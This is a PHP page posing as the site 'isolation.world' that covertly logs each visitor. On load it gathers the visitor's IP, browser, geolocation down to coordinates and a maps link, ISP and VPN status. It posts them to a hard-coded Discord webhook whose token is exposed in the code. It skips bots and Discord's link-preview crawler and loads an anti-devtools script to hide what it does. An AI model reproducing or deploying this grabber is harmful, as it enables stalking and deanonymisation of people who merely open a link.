<?php

$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];
$Hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$Webpage = $_SERVER['SCRIPT_NAME'];
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

date_default_timezone_set("America/New_York");
$Date = date('d/m/Y');
$Time = date('G:i:s');

$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNDet = json_decode(file_get_contents("https://proxycheck.io/v2/{$IP}?vpn=1&asn=1"));
if ($VPNDet->proxy === "yes") {
    $VPN = "true";
} else {
    $VPN = "false";
}

$Country = strtolower($Details->country);
$CountryCode = strtolower($Details->countryCode);
$Region = strtolower($Details->regionName);
$City = strtolower($Details->city);
$Zip = strtolower($Details->zip);
$Lat = strtolower($Details->lat);
$Lon = strtolower($Details->lon);
$Org = strtolower($Details->org);
$Webpage = $_SERVER['SCRIPT_NAME'];
$Details->countryCode = strtolower($Details->countryCode);


class Discord
{
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Org, $Webpage,  $Lat, $Lon,  $Flag;

        $Webhook = "https://discord.com/api/webhooks/1065004702061830326/T5vqqQkqKlXEXKC3BJeQKtTVId7va3wqBrw3a0HuMCwPJ28oRgg8QW4Fm97AiisOIY3o";

        $InfoArr = array(
            "embeds" => [array(

                "title" => "visitor from $Country",
                "color" => "2303786",

                "fields" => [array(
                    "name" => "ip",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "vpn",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "organization",
                        "value" => "$Org",
                        "inline" => true
                    ),
                    array(
                        "name" => "geo lookup",
                        "value" => "https://json.geoiplookup.io/$IP",
                    ),
                    array(
                        "name" => "browser",
                        "value" => "$Browser"
                    ),
                    array(
                        "name" => "country/countrycode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "region | city | zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    ),
                    array(
                        "name" => "webpage",
                        "value" => "$Webpage",
                        "inline" => true
                    ),],

                "footer" => array(
                    "text" => "$Date $Time",
                    "icon_url" => ""
                ),
            )],
        );

        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
		        return curl_exec($Curl);
    }
}
$sendembed = New Discord();
$sendembed->Visitor();
?>


<!DOCTYPE html>
<html>
    <head>
        <base href="https://isolation.world">
        <title>isolate</title>
        <meta name="description" content="isolation.world">
        <meta itemprop="name" content="isolation">
        <meta itemprop="description" content="isolation.world">
        <meta itemprop="image" content="https://isolation.world/assets/media/images/embed.png">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="isolation">
        <meta name="twitter:description" content="isolation.world">
        <meta name="twitter:image" content="https://isolation.world/assets/media/images/embed.png">
	    <link rel="shortcut icon" type="image/png" href="/assets/media/images/bat.gif">
	    <link rel="stylesheet" href="assets/css/stylev.css?ver=4">
	    <script disable-devtool-auto src="assets/js/disable-devtool.min.js?ver=2"></script>
	    <script language="Javascript" src="31017648d3a14eaa9003b900ff9ccc41.js"></script>
    </head>
</html>
